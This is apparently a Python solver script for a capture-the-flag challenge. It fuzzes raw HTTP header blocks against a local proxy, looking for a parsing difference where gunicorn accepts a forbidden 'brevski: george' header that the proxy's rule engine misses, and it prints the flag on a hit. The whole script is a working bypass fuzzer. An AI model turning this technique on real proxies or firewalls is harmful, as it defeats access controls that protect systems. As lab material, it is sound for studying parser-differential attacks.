#!/usr/bin/env python3
"""
Fuzz the header block looking for a shape where gunicorn still sees
`brevski: george` but proxoxy's rule engine doesn't.

Target is the REAL lab (proxy 28888 in front of the unmodified server.py), so a
hit prints the flag directly. Junk lines are drawn from the grammar gunicorn
accepts, since anything gunicorn rejects can never produce the flag.
"""
import random
import socket
import string
import sys
from concurrent.futures import ThreadPoolExecutor

HOST = "127.0.0.1"
PROXY = 28888

TCHAR = (string.ascii_letters + string.digits + "!#$%&'*+-.^`|~").encode()  # no _
VCHAR = bytes([9]) + bytes(range(0x20, 0x7F)) + bytes(range(0x80, 0x100))


def rand_name(rng, n=None):
    n = n or rng.randint(1, 12)
    return bytes(rng.choice(TCHAR) for _ in range(n))


def rand_value(rng, n=None):
    n = n if n is not None else rng.randint(0, 20)
    v = bytes(rng.choice(VCHAR) for _ in range(n))
    return v


def rand_line(rng):
    name = rand_name(rng)
    ows1 = b" \t"[rng.randrange(2):][:1] * rng.randint(0, 3)
    ows2 = b" \t"[rng.randrange(2):][:1] * rng.randint(0, 3)
    return name + b":" + ows1 + rand_value(rng) + ows2 + b"\r\n"


def brevski_line(rng):
    name = bytes(c ^ (0x20 if rng.random() < 0.3 else 0) for c in b"brevski")
    pre = (b" " * rng.randint(0, 2)) + (b"\t" * rng.randint(0, 2))
    post = (b" " * rng.randint(0, 2)) + (b"\t" * rng.randint(0, 2))
    return name + b":" + pre + b"george" + post + b"\r\n"


def build(seed):
    rng = random.Random(seed)
    lines = [rand_line(rng) for _ in range(rng.randint(0, 6))]
    lines.insert(rng.randint(0, len(lines)), brevski_line(rng))
    head = b"POST /flag HTTP/1.1\r\nHost: x\r\n" + b"".join(lines) + b"Content-Length: 0\r\n\r\n"
    return head


def shoot(payload, port=PROXY, timeout=2.5):
    try:
        s = socket.create_connection((HOST, port), timeout=timeout)
    except Exception:
        return b""
    out = b""
    try:
        s.sendall(payload)
        s.settimeout(timeout)
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except Exception:
        pass
    finally:
        try:
            s.close()
        except Exception:
            pass
    return out


def one(seed):
    p = build(seed)
    r = shoot(p)
    if b"TFCCTF{" in r:
        return (seed, p, r)
    return None


def main(start, count, workers=24):
    hits = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        for res in ex.map(one, range(start, start + count)):
            if res:
                seed, p, r = res
                print("*** HIT seed", seed)
                print(repr(p))
                print(repr(r[:300]))
                hits.append(seed)
    print("done", start, count, "hits", hits)


if __name__ == "__main__":
    main(int(sys.argv[1]), int(sys.argv[2]))
